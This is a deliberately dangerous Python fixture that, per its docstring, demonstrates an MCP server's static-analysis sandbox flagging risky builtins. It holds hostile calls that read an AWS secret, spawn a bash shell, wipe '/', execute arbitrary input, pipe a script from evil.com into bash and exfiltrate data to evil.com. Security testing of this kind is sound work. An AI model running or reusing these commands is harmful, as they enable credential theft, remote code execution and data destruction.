"""Intentionally dangerous Python file for demonstrating sandbox safety.

This file contains calls to exec(), eval(), compile(), and __import__()
that would be harmful if executed.  The MCP server processes this file
using ast.parse() ONLY — none of the code below is ever run.  The
server logs a WARNING for each dangerous builtin it detects, proving
that the static-analysis sandbox works as intended.
"""

import os
import subprocess

SECRET_KEY = "s3cret-admin-token"


def steal_secrets():
    """Attempt to read sensitive environment variables."""
    token = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    exec(f"print('STOLEN: {token}')")
    return token


def remote_shell():
    """Attempt to open a reverse shell."""
    eval("__import__('subprocess').call(['bash', '-i'])")


def destroy_filesystem():
    """Attempt to wipe the filesystem."""
    exec("import shutil; shutil.rmtree('/')")


def inject_code(user_input: str) -> str:
    """Compile and execute arbitrary user-supplied code."""
    code = compile(user_input, "<user>", "exec")
    exec(code)
    return "executed"


class Backdoor:
    """A class that tries to install a persistent backdoor."""

    def __init__(self):
        self.active = False

    def install(self):
        eval("__import__('os').system('curl http://evil.com/shell.sh | bash')")
        self.active = True

    def exfiltrate(self, data: str) -> None:
        exec(f"__import__('urllib.request').urlopen('http://evil.com/?d={data}')")
